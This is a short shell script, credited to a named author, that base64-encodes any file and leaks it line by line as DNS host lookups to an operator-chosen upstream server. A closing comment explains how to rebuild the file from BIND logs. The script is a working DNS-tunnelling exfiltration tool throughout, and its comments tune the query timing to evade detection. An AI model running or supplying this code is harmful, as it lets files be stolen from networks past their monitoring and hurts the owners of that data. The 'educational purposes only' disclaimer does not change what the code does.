#!/bin/sh
# Resolver.sh
# Christopher Neitzert <chris@neitzert.com>
#
# NOTE: This kinda sort of functions, it needs redone.
# Read the comments.
#
# A simple script to encode a file into a very 
# large number of DNS host look up queries for 
# later collection and reassembly on the upstream
# DNS server 
#
# This works great in the lab, terribly over WAN connections.
#
# To use: 
# Simply change '2001:db8:1:1:1:1:1:1' to your 
# IPv6 Address. If you only support IPv4, remove
# the '-6' arg on every host command.  
# 
# Additionally, consider if the -a argument is right for you.
#
#
# Make sure we are transfering ascii
export CHARSET=ASCII  				
    
# Name our base64 encoded file
B64=$(printf "$1"'.B64') 				

# Encode our file in base64 with 56 byte lines
/usr/bin/base64 -w56 $1 > $B64

# Mark the begining of the file with arbitrary "BEGIN" change to whatever.
host -6 -a -W10 BEGIN.$1 2001:db8:1:1:1:1:1:1  		

#
# Read each line of base64 encoded file into a host call, sleep 1/1000th of a second between calls
#
for line in $(cat $B64)
do

# ATTENTION Timing is key to detection and functionality. Sleep sets time between host calls to the far server. 
# 1/1000th of a second between host calls works great on a LAN or between virtual hosts. 1/3rd of a second on transoceaniac network links.
# Your results may vary depending on your DNS Server's configuration, please experiment 
        sleep 1.01					
	host -6 -a -W60 $line.io 2001:db8:1:1:1:1:1:1  	

# -6 to specifcy IPv6 
# -a for any lookup type / not entirely necessary because we only care that our request was logged upstream
# -w60 for 60 second connection timeout - useful to change if parts of file do not get transfered
# .io delimteter can be anything, Base64 does not use "." 
# 2001:db8:1:1:1:1:1:1 is destination IPv6 server, change to your server address

done
# Mark the end of the file.  with arbitrary "DONE" change to whatever.
host -6 -a -W10 DONE.$1 2001:db8:1:1:1:1:1:1 		

#
# How to decode data on the destination server
#
#
# From your favorite Unix like os, simply:
# cat $LOCATION_OF_NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
# 
# grep .io;  because that was the tld in the main host line (line 45)
# "cache" can be "cache", "REFUSED', or other - your bind implementation may have different log levels.
# 
# Tested with standard RHEL/CentOS/Ubuntu and Bind9.
# Your results may vary
#
# All standard disclaimers apply, no warranty, claims, or promises declared.
# For educational and entertainment purposes only.
# GNUv3

